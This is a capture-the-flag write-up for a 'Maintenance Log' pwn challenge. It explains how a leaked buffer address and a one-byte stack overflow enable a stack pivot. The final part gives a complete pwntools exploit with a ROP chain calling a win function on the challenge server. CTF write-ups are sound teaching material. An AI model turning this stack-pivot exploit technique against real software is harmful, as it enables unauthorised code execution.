## Maintenance Log - PWN
* Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : CSSCTF
* Point&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 50
* Difficulity&nbsp;&nbsp;&nbsp;&nbsp; : Unknown
* Solved By&nbsp;&nbsp;&nbsp;&nbsp;: Eclair
---

#### Description
*Our diagnostics terminal logged an anomaly during maintenance. The vendor insists their service is fortified with stack canaries and safe from memory corruption, but the interface IS LEAKING.*<br>
<br>
*Can you forge a maintenance report, bypass the perimeter, and acquire administrative clearance?*<br>
<br>

#### Analysis
At first, I check for the file protection.<br>
<br>
<img width="812" height="167" alt="image" src="https://github.com/user-attachments/assets/745b78c0-735c-43a1-975d-8579840a8e8b" /><br>
<br>
From the result, the file only have `Stack Canary` and `NX` is enabled, it mean we can't do overflow in certain stack frame nor execute code in the stack.<br>
After checked the file protection, I analyzed the file using `Ghidra`, since the file was `stripped`.<br>
<br>
<img width="665" height="341" alt="image" src="https://github.com/user-attachments/assets/0d8c7bd7-6215-4aef-8529-331c5d1ed8b0" /><br>
<br>
From the photo, we can see that the program ask for our input and there is something interesting that it reveal the buffer address. Maybe we can use it later, let's check for the `FUN_00401348()` function.<br>
<br>
<img width="478" height="233" alt="image" src="https://github.com/user-attachments/assets/1cd00f69-0c95-48f8-8b3e-3c47b227d1ec" /><br>
<br>
From the screenshot, I get second input and in here I realize that the input give me one-byte-off overflow and now I wonder how to take an advantage of it? And also this function has no `stack canaries` protection, so I can overflow it although only one byte<br>
And I also found, let's say `win` address since it gives me the flag, a function that give me a flag.<br>
<br>
<img width="637" height="637" alt="image" src="https://github.com/user-attachments/assets/988967a5-99d4-4998-876d-5ef9d4cb92da" /><br>
<br>
The function need an argument, first argumen is `0xdeadbeef` and second parameter is `0xcafebabe`.<br>
I think it's already clear, our goal is to control the execution flow and turn it into `win` function, the last problem is **how?**. As we know, I only have these things.<br>

* buffer address leak<br>
* one-byte-off overflow<br>

After some research and inspiration, I decide to use `stack pivoting` method, in short I will deceive `rsp` register to hold address that I want. How to do that<br>
Okey, first, let's take a look at `buffer address` reveal.<br>
<br>
<img width="950" height="101" alt="image" src="https://github.com/user-attachments/assets/e6dec850-60f7-4838-aa54-d6be4a248e3b" />
<br>
As we can see, the `buffer address` is `0x7fffffffdbe0` and keep it in mind.<br>
Now, let's check for `rbp` register, what address they hold right now.<br>
<br>
<img width="1251" height="35" alt="image" src="https://github.com/user-attachments/assets/429f2a27-dc2e-41f1-8be2-d1a00f6a498a" /><br>
<br>
Okey, from the photo, we know `rbp` register hold `0x7fffffffdbd0` and `0x7fffffffdbd0` filled with another address that is `0x7fffffffdc30`<br>
Okey, so in summary we already have:

* `first input address (buffer address leak)`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= `0x7fffffffdbe0`
* `rbp register that hold`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= `0x7fffffffdc30`

I have a bit clarification, so from the summary above, as we can see the difference is `12-bits` whereas our vulnerable only allow us to overwrite `8-LSB-bits` or `1 bytes`, so should be it was unexploitable, but hold on, it occured because we ispect in from `GDB - pwndbg`, what does it mean?<br>
Lemme tell you, `GDB` add up some `env` argument that consume a few byte of stack address, that's why, if we deal with exploitation that need precision, it can be confusing when we use `GDB`, but it's okay, actually, in remote, the difference between what `rbp` register hold and `buffer address leak` only `LSB 8-bits` or `1-byte`.<br>
<br>
Don't worry, in the end, I will show you all, it's work or not.<br>

#### Exploit
Because we already know the flow, we just need to build our payload.<br>
<br>
```python
from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('34.116.80.78', 7312)
rop = ROP(elf)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
win_add = 0x0401268

p.recvuntil(b'[*] Report buffer allocated at: ')
leak = p.recvline().strip()
real_leak = int(leak, 16)
log.success(f'leak: {leak}')
log.success(f'real leak: {hex(real_leak)}')
payload = flat(
   #exploit goes here
)


leak_8 = real_leak + 8
log.success(f'leak_8: {hex(leak_8)}')
payload_1 = p64(real_leak)
payload_1 += p64(ret)
payload_1 += p64(rdi)
payload_1 += p64(0xdeadbeef)
payload_1 += p64(rsi)
payload_1 += p64(0xcafebabe)
payload_1 += p64(win_add)

offset = 32
one_byte_off = real_leak & 0xff
pde = p8(one_byte_off)
log.success(f'LSB:{hex(one_byte_off)}')
log.success(f'P8 : {(pde)}')
payload_2 = b'a' * offset
payload_2 += p8(one_byte_off)

p.sendlineafter(b'Enter report summary: ', payload_1)
p.sendlineafter(b'Tagging operator: ', payload_2)

p.interactive()
```

Okey, that's my full exploitation, and here's the proof.<br>
<br>
<img width="793" height="442" alt="image" src="https://github.com/user-attachments/assets/c18841d1-f653-4a0c-89d5-35eaa29e1033" /><br>
<br>
Hell yeah, as you can see.

<br>
That's my full payload
